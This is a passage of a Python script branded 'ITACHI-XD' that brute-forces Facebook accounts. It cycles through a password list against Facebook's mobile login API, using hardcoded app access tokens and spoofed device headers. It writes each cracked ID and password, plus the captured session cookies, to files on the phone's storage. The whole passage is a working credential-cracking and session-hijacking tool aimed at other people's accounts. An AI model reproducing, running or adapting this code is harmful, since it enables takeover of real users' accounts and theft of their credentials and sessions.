		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [ITACHI-XD] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
			tokenlist = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32','256002347743983|374e60f8b9bb6b8cbb30f78030438895']
			accessToken = random.choice(tokenlist)
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(111111111,999999999))
			fblc = "zh_HK"
			fbfw = '1'
			fbrv = '0'
			if '350685531728' in accessToken:
				fban = 'FB4A'
				fbpn = 'com.facebook.katana'
			else:
				fban = 'Orca-Android'
				fbpn = 'com.facebook.orca'
			ua = ua33()
			head = {"User-Agent":ua,"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
			data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"zh_HK","client_country_code":"HK","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
			po = requests.post('https://b-api.facebook.com/method/auth.login',data=data,headers=head).json()
			if "session_key" in po:
				uid = str(po['uid'])
				token = po['access_token']
				print('\r\r\033[1;32m [ITACHI-OK] '+uid+' | '+pas)
				oks.append(ids)
				open('/sdcard/ITACHI/ITACHI-R-OK.txt','a').write(uid+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/ITACHI/ITACHI-R-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass

try:main()
except requests.exceptions.ConnectionError:
	print('\n No internet connection ...')
except Exception as e:pass
apv()
